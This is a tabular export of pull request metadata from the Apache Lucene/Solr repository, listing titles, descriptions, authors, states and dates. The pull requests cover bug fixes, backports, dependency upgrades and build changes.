"","2070","LUCENE-9536: Correct the OrdinalMap optimization.","Previously we only checked that the first segment's ordinal deltas were all zero. This didn't account for some rare cases where some of the segment's ordinals are filtered out, so the ordinals aren't contiguous. In these cases we fill in dummy values for the missing ordinal deltas. So a segment's ordinals can appear to match the global ordinals perfectly, but not actually contain all the terms.  Such a case can arise when using a FilteredTermsEnum, for example when merging a segment with deletions.","closed","","jtibshirani","2020-11-09T21:17:36Z","2020-11-10T16:02:57Z"
"","1833","LUCENE-9501: Fix invariant violation in IndexSortSortedNumericDocValuesRangeQuery.","Previously the DocIdSetIterator returned an old value for docID even after advance returned NO_MORE_DOCS. This violates the DocIdSetIterator contract and made it possible for the iterator's advance method to be called even after it was already exhausted.","closed","","jtibshirani","2020-09-04T22:29:45Z","2020-09-10T23:38:47Z"
"","1845","SOLR-14613: Autoscaling replacement using placement plugins","Previous [PR1684](https://github.com/apache/lucene-solr/pull/1684/) was too large and too slow.  This new PR takes into account (most) comments made on the old PR.  This code is untested! It wasn't actually run in its current form. It is still work in progress but I want to make sure it is now acceptable and possibly start parallelizing work on it... (post merge?)","closed","","murblanc","2020-09-09T00:47:16Z","2020-09-16T22:33:59Z"
"","2455","Make SolrInputField name optional","Prevents other bugs by failing fast  Very minor change.","open","","dsmiley","2021-03-04T20:45:53Z","2021-03-04T20:45:53Z"
"","1873","Reference impl gradle updates","Preparing to pull in recent gradle related updates","closed","","thelabdude","2020-09-14T16:38:57Z","2020-10-08T16:40:32Z"
"","1738","LUCENE-9454: upgrade hamcrest to version 2.2.","Precommit passes with ant and gradle. Running tests now.","closed","","dweiss","2020-08-11T09:29:44Z","2020-08-11T09:56:01Z"
"","1730","SOLR-14680: Provide an implementation for the new SolrCluster API","PR implementing #1694","closed","clean-api,","noblepaul","2020-08-10T02:20:40Z","2020-08-14T01:11:06Z"
"","2013","SOLR-14445: Add Entity Caching documentation","PR against branch_8x. Superseeds #1466 which was for master.  @tkaessmann","closed","","janhoy","2020-10-21T11:36:33Z","2020-10-21T11:38:55Z"
"","1971","SOLR-14900: 8.x changes to update Jekyll","PR #1923 will upgrade Jekyll to 4.x for the master branch. I propose to do the same thing with our Ant build in branch_8x. This also fixes the code syntax styling bug fixed in the other PR and updates the README.adoc to reflect the new version requirements.  I don't intend to merge this until _after_ 8.7 is released because it will require anyone who wants to build the Ref Guide in 8.x to upgrade Ruby to at least 2.5 (if it's not already) and upgrade Jekyll. If someone is trying to do something quick I don't want to slow them down.","closed","","ctargett","2020-10-09T20:11:10Z","2021-08-09T20:49:27Z"
"","1952","LUCENE-9565 Fix competitive iteration","PR #1351 introduced a sort optimization where documents can be skipped. But iteration over competitive iterators was not properly organized, as they were not storing the current docID, and when competitive iterator was updated, the current doc ID was lost.  This patch fixes it.  Relates to #1351","closed","","mayya-sharipova","2020-10-06T14:29:12Z","2020-10-07T02:37:29Z"
"","1943","LUCENE-9555: Advance conjuction Iterator for two phase iteration","PR #1351 introduced a sort optimization where documents can be skipped.   But there was a bug in case we were using two phase approximation, as we would advance it without advancing an overall conjunction iterator.  This patch fixed it.  Relates to #1351","closed","","mayya-sharipova","2020-10-02T16:27:16Z","2020-10-06T13:22:47Z"
"","2236","LUCENE-9691: Hunspell: support trailing comments on aff option lines","plus cleanup & deduplicate parsing   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  e.g.  ``` # Testing also whitespace and comments. OCONV 2 # space, space OCONV   a A # tab, space, space OCONV   b   B # tab, tab, space ```  # Solution  Deduplicate the code where an aff string is split into parts by whitespace, allow for # in the first unexpected part there  # Tests  Expanded `conv` test  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-22T11:59:20Z","2021-01-25T11:59:05Z"
"","1879","LUCENE-9528: cleanup of flexible query parser's grammar","Piggybacks some cleanups to javacc generation scripts as well.","closed","","dweiss","2020-09-16T20:09:23Z","2020-09-18T07:38:21Z"
"","2022","LUCENE-9004: KNN vector search using NSW graphs","Phew this has been a long time coming, but I think it is in good shape now. We started with a scratchy prototype about a year ago, then @mocobeta got it on a better footing by adding a new codec and also implemented the full hierarchical algorithm, making the graph search faithful to the published literature. Then we took a step back to add underlying vector format as a separate patch, now landed. This patch builds on the new vector format, providing KNN search with NSW graphs. It's the simplest implementation I could tease out (single layer graph, simple neighbor selection, no max fanout control), but I think it will be a good foundation. I've done some pretty extensive performance testing and hyperparameter exploration using the (included) KnnGraphTester with some proprietary data, and get good results. I will follow up later with specifics, but single-threaded latencies in a few ms on my i7 laptop over a 1M x 256-dim dataset seems pretty good. Followups will include repeatable benchmarks on public datasets.","closed","","msokolov","2020-10-23T22:31:19Z","2020-11-16T20:42:42Z"
"","2408","SOLR-13034: RTG sometimes didn't materialize LazyField","Partial (AKA Atomic) updates could encounter ""LazyField"" instances in the document cache and not know hot to deal with them when writing the updated doc to the update log.  https://issues.apache.org/jira/browse/SOLR-13034","closed","","dsmiley","2021-02-20T01:57:28Z","2021-02-28T03:03:03Z"
"","2287","Remove write logic from Lucene70NormsFormat.","Our policy is to not maintain write logic for old formats that can't be written to. The write logic is moved to the test folder to support unit testing.","closed","","jtibshirani","2021-02-01T19:41:16Z","2021-02-03T17:28:52Z"
"","2044","Set pinentry-mode to loopback for artifact signing.","On my GPG version, not doing so makes `ant sign-artifacts` fail as the default pinentry mode is `ask`, which wants to create a dialog that asks for the GPG password.","open","","jpountz","2020-10-29T11:08:16Z","2020-10-29T11:08:16Z"
"","2564","Fix gpg key download in release wizard.","Old URL to check the apache id gpg key is no longer available.","closed","","HoustonPutman","2021-09-02T20:23:52Z","2021-09-02T22:08:31Z"
"","1703","SOLR-14686: remove SolrCore.logid","Obsoleted by MDC  https://issues.apache.org/jira/browse/SOLR-14686","closed","","dsmiley","2020-07-28T19:49:42Z","2022-01-12T04:50:43Z"
"","2402","SOLR-15162: Add some parameters to make MODIFYCOLLECTION v1 and v2 more similar.","Not sure on rule, snitch, and policy on if they are still real.  Wish we had docs for rule, snitch, and policy in the Solr Ref Guide page under CREATE, appears to be half fixed.  # Description  Adding some parameters to make V2 match V1.  # Solution  I tested the addition of `readOnly` and it worked great.  I didn't test `rule`, `snitch` or `policy` because I don't understand if they are still real or not, and it was unclear to me from reading the Ref Guide if they existed.   Some cleanup needed there!  # Tests  Manually tested `readOnly` being passed in.  # Checklist  Please review the following and check all that apply:  - [X ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ X] I have created a Jira issue and added the issue ID to my pull request title. - [ X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X ] I have developed this patch against the `master` branch. - [X ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ X] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2021-02-18T21:05:30Z","2021-02-20T15:49:10Z"
"","2100","LUCENE-9047: PoC of some ideas regarding transparent, efficient handling of byte order","Not for merging.","open","","dweiss","2020-11-27T09:33:32Z","2020-11-27T09:33:32Z"
"","2357","SOLR-15145: Fix up changes.txt in branch_8x for 8.8.1 release","No code changes, just updating release note and changes.txt","closed","","thelabdude","2021-02-11T20:45:10Z","2021-02-11T20:53:47Z"
"","1939","LUCENE-9553: Adds a XYPoint query that accepts an array of XYGeometries","New query that accepts an array of XYGeometries.","closed","","iverase","2020-10-02T10:44:09Z","2020-11-03T08:23:51Z"
"","1940","LUCENE-9552: Adds a LatLonPoint query that accepts an array of LatLonGeometries","New query that accepts an array of LatLonGeometries.","closed","","iverase","2020-10-02T13:58:00Z","2020-11-03T08:24:16Z"
"","2458","SOLR-15215: SolrJ: Remove Netty dependency","Netty is an *optional* dependency of Zookeeper; one must opt-in to use it. Netty remains a solr-core dependency transitively via Hadoop/HDFS.  https://issues.apache.org/jira/browse/SOLR-15215","open","","dsmiley","2021-03-05T15:10:56Z","2021-03-05T15:51:20Z"
"","1942","SOLR-14910: Use in-line tags for logger declarations in Gradle ValidateLogCalls that are non-standard, change //logok to //nowarn","Most of this is just changing //logok to //nowarn.   The substantive changes are in validate-log-calls.gradle, taking out the special handling for several files and _not_ producing failures if there's a //nowarn on the line instead, plus adding a few //nowarn tags in the files that were handled specially.","closed","","ErickErickson","2020-10-02T15:10:48Z","2020-10-03T13:52:02Z"
"","1936","Remove sleeps from SolrZkClientTest.testWrappingWatches","Minor change to speedup `SolrZkClientTest.testWrappingWatches`","closed","","tflobbe","2020-10-01T06:27:22Z","2020-10-26T17:11:16Z"
"","2490","SOLR-6152 Pre-populating values into search parameters on the query page of solr admin","Merge to main: https://github.com/apache/lucene-solr/pull/2489","closed","","daniel6691","2021-05-06T22:16:46Z","2021-05-12T10:10:39Z"
"","2560","SOLR-15410: Always use -Xverbosegclog for OpenJ9","Merge SOLR-15410 to branch_8x","closed","","colvinco","2021-08-26T13:13:02Z","2021-08-26T16:35:18Z"
"","2393","SOLR-15160 update cloud.sh","Make cloud.sh work with gradle on master","closed","","gus-asf","2021-02-17T22:59:43Z","2021-02-21T19:36:19Z"
"","1743","Gradual naming convention enforcement.","LUCENE-8626. Here's how you can do it in a progressive, incremental way: make an exception list for existing suites not following the convention, but enforce it on anything new.","open","","dweiss","2020-08-12T07:30:27Z","2021-03-02T17:55:27Z"
"","2556","LUCENE-10051 lucene branch_8x run ant run-task error","LUCENE-10051 lucene branch_8x run ant run-task error  bugfix","closed","","xiaoshi2013","2021-08-18T14:25:31Z","2021-08-20T06:35:01Z"
"","1895","SOLR-14879: address TestPackages test failures","Looks like the problem is with ManagedSchema. I've modified the test to not use ManagedSchema","closed","","noblepaul","2020-09-20T02:32:19Z","2020-09-23T08:01:02Z"
"","2232","SOLR-15097: Supply base_url in replica data returned to Admin UI","Looks like a bad backport from master for SOLR-12182.  Fix here is to pass the collection metadata through `ClusterStatus#postProcessCollectionJSON` to supply `base_url` from `node_name` as it's required by the UI.  There is no unit test for `ZookeeperInfoHandler` unfortunately, so requires manual testing: ``` cd solr ant server bin/solr -c bin/solr create -c test ``` Visit the Admin UI and click on the Graph View for Cloud. Ensure you see the test collection in the graph.","closed","","thelabdude","2021-01-21T23:05:33Z","2021-01-21T23:32:42Z"
"","2491","LUCENE-9953: Make FacetResult#value accurate for LongValueFacetCounts","LongValueFacetCounts is not populating FacetResult#value correctly for cases where a doc is multi-valued. This addresses the bug.","closed","","gsmiller","2021-05-10T20:03:22Z","2021-05-18T17:03:16Z"
"","2077","LUCENE-9605: update snowball to d8cf01ddf37a, adds Yiddish","Just merged their master branch, regenerated the patch file, and reran `gradlew snowball`, precommit and tests.","closed","","rmuir","2020-11-12T01:47:00Z","2020-11-14T14:27:09Z"
"","2466","A silly test pr (DO NOT MERGE)","Just for documentation's sake.","closed","","janhoy","2021-03-08T23:26:14Z","2021-11-05T09:33:25Z"
"","2488","SOLR-15391: Enable 'canUsePoints' for PointFields in Solr","Just a draft for now, no tests or performance numbers.  For 8.x only","open","","tflobbe","2021-05-04T07:13:21Z","2021-05-04T07:13:21Z"
"","2194","LUCENE-9590: Add javadoc for Lucene86PointsFormat class","JIRA: https://issues.apache.org/jira/browse/LUCENE-9590  1. since Lucene 4.8.0,  mergingNumericUpdates was replaced by mergingDVUpdates, so we should update some annotation. see detail: https://issues.apache.org/jira/browse/LUCENE-5513 2. add a link on ASF WIKI to introduce the data structure of point value , it make source readers happy and quick to understand point value.","closed","","LuXugang","2021-01-11T03:23:11Z","2021-02-11T20:25:29Z"
"","1695","LUCENE-9321: Fix Javadoc offline link base url for snapshot build","JIRA: https://issues.apache.org/jira/browse/LUCENE-9321  This includes two changes in documentation task.  1. Fix Javadoc offline link base url to make snapshot build pass `checkBrokenLinks`. 2. Explicitly disable cross-project link for `:solr:test-framework`, otherwise broken links are generated due to split package issue. See: https://github.com/apache/lucene-solr/blob/master/solr/test-framework/build.xml#L59  By applying those changes, `./gradlew :solr:checkBrokenLinks` succeeds on snapshot build.","closed","","mocobeta","2020-07-26T09:02:11Z","2020-07-28T13:39:08Z"
"","2510","SolrZkClient: remove dead code","It's impossible for the ""prettyPrint"" code to be reached.  This has been so for 9 years.","closed","","dsmiley","2021-06-09T20:34:47Z","2021-06-12T15:22:16Z"
"","1926","LUCENE-9544: Port Nori dictionary compilation","It's almost the same as the #1924 (except CHANGES.txt).","closed","","danmuzi","2020-09-28T09:40:52Z","2020-09-28T11:29:17Z"
"","1846","LUCENE-9513 Use seconds instead of millisecs","It's a minor mistake and it doesn't affect the output due to the scale change (It will just make PAST_HOUR, PAST_SIX_HOURS not as intended). Still it's better to be correct.   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","frankmanzhu","2020-09-09T06:57:52Z","2020-09-13T08:09:17Z"
"","2461","SOLR-2852: SolrJ: remove Woodstox dependency","It was never truly required there. Pervasive use of ""javabin"" reduces the need to care about client-side XML speed.  Better to reduce dependencies and let clients use the libs they want.  https://issues.apache.org/jira/browse/SOLR-2852  BTW I couldn't set ""runtimeOnly"" for it's inclusion in solr-core because the text tagger explicitly uses it in XmlOffsetCorrector.  I wrote that.  I don't recall if it was performance reasons or if it was for access to location metadata that I otherwise didn't see how to get.","closed","","dsmiley","2021-03-05T16:15:10Z","2021-03-09T05:27:15Z"
"","2192","SOLR-15010 Try to use jattach for threaddump if jstack is missing","Introduce jattach check if jstack is missing.  jattach ships in the Solr docker image instead of jstack.   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  With the Solr Docker image you get an alarming message about jstack being missing, and meanwhile we have jattach installed in our Docker image, so lets use that if we need to kill Solr.  # Solution  Checks if jattach exits, and adds it as a command, and then if jstack is missing, runs the jattach threaddump command.  # Tests  Hard to test!   I tweaked the bin/solr command to not actually shut solr down, in order to trigger the thread dump, then tested by building the Solr 9 Docker image, and issuing to the image called `solr3`: ``` docker exec solr3 solr stop -p 8983 Sending stop command to Solr running on port 8983 ... waiting up to 180 seconds to allow Jetty process 16 to stop gracefully. Solr process 16 is still running; jattach threaddumping it now. Connected to remote JVM Response code = 0 2021-01-08 22:01:34 Full thread dump OpenJDK 64-Bit Server VM (11.0.9.1+1 mixed mode): ```  I then tested it with jstack by running it locally, but with the same commented out code and it worked, and then finally restored the commented out code and the start/stop cycle worked.  I did NOT change anything for Windows.  # Checklist  Please review the following and check all that apply:  - [ X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ X] I have created a Jira issue and added the issue ID to my pull request title. - [ X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ X] I have developed this patch against the `master` branch. - [ X] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2021-01-08T22:20:19Z","2021-01-11T19:58:11Z"
"","2641","SOLR-15965 Use proper signatures for SolrAuth","Internode communication secured by PKI Authentication has changed formats.  Difference from 9x is that on 8x we will still default to send v1 and accept v1,v2","closed","","madrob","2022-02-16T04:04:47Z","2022-05-31T15:42:20Z"
"","1876","LUCENE-9525: Better handle small documents with Lucene87StoredFieldsFormat.","Instead of configuring a dictionary size and a block size, the format now tries to have 10 sub blocks per bigger block, and adapts the size of the dictionary and of the sub blocks to this overall block size.","closed","","jpountz","2020-09-15T13:57:08Z","2020-09-16T11:09:05Z"
"","1715","SOLR-14704 add download option to cloud.sh","Initial cut at this, only tested on mac osx so far.","closed","","gus-asf","2020-08-03T03:27:40Z","2020-09-04T13:39:24Z"
"","2288","LUCENE-9722: Close merged readers on abort","IndexWriter fails to close the merged readers of an aborted merge if the output segment contains no document.  This bug was discovered by a test in Elasticsearch (https://github.com/elastic/elasticsearch/issues/67884).","closed","bug,","dnhatn","2021-02-02T01:20:29Z","2021-02-03T20:05:36Z"
"","1779","LUCENE-9478: Prevent DWPTDeleteQueue from referencing itself and leaking memory","In LUCENE-9304 we introduced some fixes that unfortunately hold on to the previous DWPTDeleteQueue which is essentially leaking IW memory and cause applications to fail. This fixes the memory leak and adds a test to ensure its not leaking memory.","closed","","s1monw","2020-08-24T16:14:05Z","2020-10-03T21:32:24Z"
"","2298","LUCENE-9680 - Backport to 8x - Remove deprecation from getFieldNames","In [LUCENE-9680](https://issues.apache.org/jira/browse/LUCENE-9680) we re-added `IW::getFieldNames` back to `master`. The method still exists in 8x, so this simply removes the deprecation annotation.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","orenovadia","2021-02-03T20:43:34Z","2021-02-03T22:33:37Z"
"","1916","Fix minor typo","Ignoring the default issue template given that this PR is about a tiny fix for a typo. Right?","closed","","dalbani","2020-09-23T14:52:27Z","2020-09-23T15:08:27Z"
"","2454","Test docker change, just to see if the docker github action works","Ignore this. Just testing the github action.","closed","","HoustonPutman","2021-03-04T18:44:01Z","2021-03-05T21:42:20Z"
"","1777","LUCENE-9477: Don't leave potentially broken segments file behind","If we fail to rollback an already renamed pending segments file during commit due to a failure in directory syncing we might not fully roll back to a proper state if we hit a failure during rollback which leaves the index in a broken state. This is a best effort approach to remove the renamed file in the case of a failure during sync.","closed","","s1monw","2020-08-24T10:07:45Z","2020-08-24T18:19:45Z"
"","2317","LUCENE-9741: Add sequential optimization for stored fields","If we are reading the stored-fields of document ids (25, 27, 28, 26, 99), and doc-25 triggers the stored-fields reader to decompress a block containing document ids [10-50], then we can tell the reader to read not only 25, but 26, 27, and 28 to avoid decompressing that block multiple times.   This PR proposes adding a new optimized instance of stored-fields reader that allows users to select the preferred fetching range.","closed","optimization,","dnhatn","2021-02-07T21:08:42Z","2021-02-17T02:48:02Z"
"","1961","LUCENE-9567: JPOSSFF loads built-in stop tags by default","If a user does not specify the ""tags"" argument for JapanesePartOfSpeechStopFilterFactory, it is unlikely that their intention was to omit the filter. (Why would they use JapanesePartOfSpeechStopFilterFactory at all in that case?)  This change loads the stoptags.txt that ships in the Kuromoji analysis jar if no tags argument is specified.   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Loading default stop tags if ""tags"" argument is not specified in JapanesePartOfSpeechStopFilterFactory.  # Solution  If the ""tags"" argument is not specified. then we load the default stop tags (as defined by `JapaneseAnalyzer.getDefaultStopTags()`) in the constructor (rather than waiting for the call to `inform`).  This implementation was chosen to be consistent with KoreanPartOfSpeechStopFilterFactory.  I added a note to MIGRATE.md, in case anyone is currently using JapanesePartOfSpeechStopFilterFactory with no arguments, to let them know that it will begin having an effect due to this change.  # Tests  Added a unit test to verify the behavior without specifying the ""tags"" argument.  # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X] I have developed this patch against the `master` branch. - [X] I have run `./gradlew check`. - [X] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","msfroh","2020-10-07T22:08:13Z","2020-10-09T14:52:08Z"
"","1760","SOLR-14750: TestBulkSchemaConcurrent passes but schema plugins fail","I've isolated the changes that caused schema `TestBulkSchemaConcurrent` tests to fail  This bug was introduced by [SOLR-14151](https://issues.apache.org/jira/browse/SOLR-14680) .  So, in this PR, I have disabled those tests and reopened the ticket. I'll need to do further investigation to see why exactly is it failing. In the worst case, this PR can be merged right away to unblock others and we can add a real fix later.  Though the test that is failing is `TestBulkSchemaConcurrent`, the reason for the failure is that that tests do a lot of core reloads and the bug is pertaining to core reload. No other test stresses core reload so much","closed","test-fix,","noblepaul","2020-08-18T07:16:04Z","2020-09-23T08:01:33Z"
"","2595","LUCENE-10141: Add the next minor version on Lucene's main branch in the split repo so the backcompat_master task works","I think the reason the `addBackcompatIndexes.py` script failed (`backcompat_master` step) when I built 8.10 was the missing Version info for 8_11, see: https://issues.apache.org/jira/browse/LUCENE-10131  So this PR adds a task to run the `addVersion.py` script for Lucene's main branch (in the split-out repo) so that the `backcompat_master` step works later in the release process.","closed","","thelabdude","2021-10-26T22:35:10Z","2021-11-01T21:16:44Z"
"","2482","SOLR-15356: Deprecate UninvertDocValuesMergePolicyFactory","I think a `solr/CHANGES.txt` entry for Solr 8.x is not warranted given the specialised use of the class but it would seem nice to provide some indication to anyone using it w.r.t. the class being removed in future Solr 9 via the https://github.com/apache/solr/pull/83 change?  https://issues.apache.org/jira/browse/SOLR-15356","closed","","cpoerschke","2021-04-22T16:23:05Z","2021-04-30T11:27:28Z"
"","2633","Add the missing 7.7.3 changes section","I noticed that this branch lacks the CHANGES entries from 7.7.3 release. So here it is, copied from branch_7_7","closed","","janhoy","2021-12-20T13:33:47Z","2021-12-20T14:01:23Z"
"","2653","Several backports from main","I have backported five bugfixes from main to branch_8_11  There were some merge conflict resolution, I mostly used IntelliJ auto-resolve and some manual fixing. Ran the new tests. Currently running precommit and full test suite.  Some manual inspection by @epugh @hossman @dsmiley and @risdenk who were original authors would be appreciated before merge.","closed","","janhoy","2022-05-12T11:37:55Z","2022-05-12T14:34:04Z"
"","2452","LUCENE-9580: Don't introduce collinear edges when splitting polygon","I had a look into this failing polygon and it seems the issue comes in the logic the splits the polygon for further processing. It might happen that the new edge introduced is collinear with edges from the polygon. This situation makes this edges not eligible for filtering and it makes the logic fail.  This change makes sure we don't introduce collinear edges when splitting polygons.","closed","","iverase","2021-03-04T12:07:37Z","2021-03-09T07:51:00Z"
"","2565","LUCENE-10035: Simple text codec add multi level skip list data (#224)","I felt bad that we did not backport LUCENE-10035 to 8.x!  Just because 9.0 is coming soon, I don't think we should cut back on backporting ""safe"" changes.  Else we get ourselves into this awkward and possibly long-lasting and hard to predict lull leading up to the major release ...  The `git cherry-pick` hit a few interesting conflicts, mostly due to `tidy` styling changes, but a few due to `IndexOutput`/`DataOutput` change that was main-only.  I think I safely resolved all of them, and `ant precommit` and `ant test` inside `lucene` sub-directory pass.  Maybe @wuda0112 or @jpountz wants to take a quick look?  I tried running `ant test -Dtests.codec=SimpleText` in `lucene/core` and all tests (slowly) passed!","closed","","mikemccand","2021-09-03T13:41:02Z","2021-09-03T14:18:58Z"
"","2472","SOLR-15217: Use shardsWhitelist in ReplicationHandler.","I didn't update the doc as I'm not sure where/what to update. Should I?","closed","","bruno-roustant","2021-03-29T09:36:58Z","2021-06-09T14:38:12Z"
"","2531","SOLR-15526 Use new cluster for each LeaderTragicEvent test","https://issues.apache.org/jira/projects/SOLR/issues/SOLR-15526  Not thrilled with this solution, but it seems to work for now.","closed","","madrob","2021-07-09T19:48:40Z","2021-07-11T04:07:49Z"
"","2489","SOLR-6152  Pre-populating values into search parameters on the query page of solr admin","https://issues.apache.org/jira/browse/SOLR-6152","closed","","daniel6691","2021-05-06T11:55:33Z","2021-05-12T10:09:07Z"
"","2661","SOLR-16213 Upgrade Jackson to version 2.13.3","https://issues.apache.org/jira/browse/SOLR-16213","closed","","janhoy","2022-05-24T20:24:39Z","2022-05-30T09:41:56Z"
"","2647","SOLR-16095 Upgrade JQuery to 3.5.1 in velocity contrib module","https://issues.apache.org/jira/browse/SOLR-16095  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x]  I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x]  I have developed this patch against the `branch_8_11` branch. - [x]  I have run unit tests agains the changes. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Reference Guide](https://github.com/apache/solr/tree/main/solr/solr-ref-guide)","closed","","bszabo97","2022-03-16T09:34:22Z","2022-03-17T12:58:22Z"
"","2644","SOLR-16009 Add custom udfs for filtering inside multi-valued fields","https://issues.apache.org/jira/browse/SOLR-16009  ## Description  Force Calcite's simplify flag to false to avoid Calcite erasing query constructs that are meaningful for matching multi-valued fields, see test case from JIRA.  ## Solution  * Disabling the simplify action in Calcite (via Hook.REL_BUILDER_SIMPLIFY), allows WHERE clauses that match multi-valued fields. However, changing this property to false resulted in changes to the Logical query plan passed to SolrFilter, especially around NOT BETWEEN clauses (which required some refactoring in SolrFilter). However, we also got a nice fix to a previous problem that we worked around in a hacky way, see change here: https://github.com/apache/solr/pull/715/files#diff-5b2c3025d1fe325fee5dd09fbf0d271e28dac1740c886621490e4dc23fa16e9bR2486 * Add udf's for filtering in multi-valued fields * Support syntax like `WHERE mv_field = 'a' and mv_field = 'b'` would not make sense using SQL but we can support this via custom udfs","closed","","kiranchitturi","2022-02-28T06:39:17Z","2022-03-03T17:11:29Z"
"","2635","SOLR-15871: Update Log4J to 2.17.1","https://issues.apache.org/jira/browse/SOLR-15871","closed","","janhoy","2022-01-03T10:25:19Z","2022-01-03T13:07:57Z"
"","2632","SOLR-15848 BadApple failing tests in branch_8_11","https://issues.apache.org/jira/browse/SOLR-15848","closed","","janhoy","2021-12-14T10:24:50Z","2021-12-14T10:47:04Z"
"","2628","SOLR-15844 Upgrade Velocity to v2.3","https://issues.apache.org/jira/browse/SOLR-15844","closed","","janhoy","2021-12-10T09:38:24Z","2021-12-13T00:54:31Z"
"","2631","SOLR-15843 Upgrade log4j from 2.15 to 2.16","https://issues.apache.org/jira/browse/SOLR-15843  https://logging.apache.org/log4j/2.x/changes-report.html#a2.16.0","closed","","janhoy","2021-12-14T00:45:14Z","2021-12-18T14:12:36Z"
"","2627","SOLR-15843","https://issues.apache.org/jira/browse/SOLR-15843","closed","","madrob","2021-12-10T02:24:39Z","2021-12-10T22:10:21Z"
"","2622","SOLR-15826 ResourceLoader should better respect allowed paths","https://issues.apache.org/jira/browse/SOLR-15826 backport from main","closed","","janhoy","2021-12-02T21:12:41Z","2021-12-06T13:49:22Z"
"","2629","SOLR-15804 Support leading slash for ""file"" parameter","https://issues.apache.org/jira/browse/SOLR-15804 Backport of https://github.com/apache/solr/pull/456  These changes are needed to make Velociry templates work as they used to, even after we now check that the path is inside config dir.","closed","","janhoy","2021-12-13T00:43:01Z","2021-12-13T00:47:50Z"
"","2604","SOLR-15768 Tune zookeeper request handler permissions","https://issues.apache.org/jira/browse/SOLR-15768  This is targeted for 8.11.1","closed","","janhoy","2021-11-05T09:37:22Z","2021-11-19T09:02:10Z"
"","2590","SOLR-15691: Admin UI raises yellow warning with case diff in host name","https://issues.apache.org/jira/browse/SOLR-15691  Back-ported of https://github.com/apache/solr/pull/345","closed","","janhoy","2021-10-12T21:54:40Z","2021-10-12T22:10:09Z"
"","2533","SOLR-15549: Add support for Solr 9.0 clouds in ZkStateReader","https://issues.apache.org/jira/browse/SOLR-15549","closed","","HoustonPutman","2021-07-16T19:49:26Z","2021-07-20T16:47:16Z"
